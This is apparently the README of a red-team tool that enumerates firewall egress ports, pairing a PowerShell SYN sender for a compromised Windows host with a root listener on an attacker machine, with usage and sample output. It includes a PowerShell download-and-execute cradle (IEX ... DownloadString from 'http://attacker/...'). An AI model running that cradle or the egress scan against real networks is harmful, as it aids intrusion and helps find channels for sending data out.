# Purpose

A "fast", LOLBAS PowerShell solution for enumeration of egress ports through
firewalls. Contains two pieces:

- Test-TcpPort.ps1 - for use on a Windows target in the internal network.
  Assumes PowerShell v5.0 at a minimum. Uses native Win32 API networking calls.
- egress_enumerator.sh - The listener to be run on the attacker-controlled Linux
  host. Requires elevated privileges.

Operates on the nmap SYN scan principle. If a SYN packet can traverse LAN -> WAN
across the firewall for a given port, then that port is a good candidate for
egress.

# How to use

## Test-TcpPort.ps1

All that's required is to be able to source this script on the target, for
example

- `IEX(New-Object Net.WebClient).DownloadString("http://attacker/Test-TcpPort.ps1")`
- Transfer to target and run from disk
- Copy-paste function definitions into PowerShell session

`Get-Help` is your friend.

```
Test-TcpPort    Send a SYN packet to the specified host. Accepts ports via pipeline.
Get-TopPorts    Produce a list of the Top N most commmon services, default first 100
```

```powershell
PS > Get-TopPorts -NumPorts 50 | Test-TcpPort -ComputerName 172.16.127.136
[*] Running in egress mode - check listener on attacker for egress ports
```

## egress_enumerator.sh

Requires root. Runs on attacker-controlled Linux host. Produces a real-time list
of ports receiving incoming SYN packets. On termination (Ctrl-C), produces a
summary of all distinct ports seen during listening session.

### Usage

```
  ___                    ___                             _
 | __|__ _ _ _ ___ _____| __|_ _ _  _ _ __  ___ _ _ __ _| |_ ___ _ _
 | _|/ _` | '_/ -_|_-<_-< _|| ' \ || | '  \/ -_) '_/ _` |  _/ _ \ '_|
 |___\__, |_| \___/__/__/___|_||_\_,_|_|_|_\___|_| \__,_|\__\___/_|
     |___/

    usage: ./egress_enumerator.sh [listener iface]

    default listner iface:  tun0
```

```bash
sudo ./egress_enumerator.sh
  ___                    ___                             _
 | __|__ _ _ _ ___ _____| __|_ _ _  _ _ __  ___ _ _ __ _| |_ ___ _ _
 | _|/ _` | '_/ -_|_-<_-< _|| ' \ || | '  \/ -_) '_/ _` |  _/ _ \ '_|
 |___\__, |_| \___/__/__/___|_||_\_,_|_|_|_\___|_| \__,_|\__\___/_|
     |___/

[*] listening on 10.10.14.44
8080
9001
9001
80
443
8080
8888
9001
^C

=============== SUMMARY OF PORTS SEEN ===============
80      443     8080    8888    9001
=====================================================
```
